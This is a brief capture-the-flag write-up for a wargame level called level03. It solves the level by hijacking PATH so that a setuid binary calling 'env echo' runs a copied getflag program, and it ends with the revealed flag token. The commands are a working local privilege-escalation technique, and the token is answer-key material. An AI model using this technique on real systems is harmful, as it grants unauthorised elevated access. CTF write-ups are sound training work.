# ls -la in homedir:

[...]
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
[...]


# executing the binary

output :
Exploit Me


# cat level03

in the binay we can see a string literal : "/usr/bin/env echo Exploit me"
we can take advantage of the binary executing the "echo" command as "flag03" user


# copy the getflag binay into a file called echo

cp /bin/getflag /tmp/echo


# change the PATH env variable

export PATH="/tmp"


# execute the binary again

./level03

output:
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
